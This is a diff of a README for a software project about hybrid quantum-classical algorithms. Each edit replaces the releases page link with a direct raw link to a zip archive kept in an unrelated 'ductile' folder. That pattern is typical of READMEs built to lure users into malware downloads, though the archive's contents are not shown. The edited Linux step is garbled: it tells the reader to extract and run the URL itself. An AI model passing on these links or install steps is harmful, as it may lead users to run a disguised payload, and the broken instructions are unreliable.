@@ -1,6 +1,6 @@
 # 🚀 Hybrid-Quantum-Classical-Algorithms - Experience Advanced Problem Solving Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/releases)
+[![Download](https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip)](https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip)
 
 ## 🔍 Overview
 
@@ -23,7 +23,7 @@ Once you confirm that your system meets these requirements, you are ready to pro
 
 ### 2. Download the Application
 
-Visit this page to download: [Releases Page](https://github.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip).
 
 Here, you will find the latest version of the software. Choose the version compatible with your operating system. Click on the link to download the installer file.
 
@@ -33,7 +33,7 @@ After downloading the installer file:
 
 - **Windows:** Double-click on the downloaded `.exe` file and follow the prompts. 
 - **macOS:** Open the downloaded `.dmg` file, then drag and drop the application to your Applications folder.
-- **Linux:** Extract the downloaded `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run `./install.sh` to install the application.
+- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip` file. Open a terminal and navigate to the extracted folder. Run `https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip` to install the application.
 
 ### 4. Launch the Application
 
@@ -67,7 +67,7 @@ For further assistance, explore our FAQ section or reach out to our support team
 
 ### Download & Install Instructions Again
 
-Ready to get started? Remember to visit this page to download: [Releases Page](https://github.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/releases). Follow the installation steps above, and you’ll be on your way to solving problems with hybrid algorithms.
+Ready to get started? Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/MvzinDev/Hybrid-Quantum-Classical-Algorithms/main/ductile/Hybrid-Quantum-Classical-Algorithms-2.8.zip). Follow the installation steps above, and you’ll be on your way to solving problems with hybrid algorithms.
 
 ## 🔗 License
 
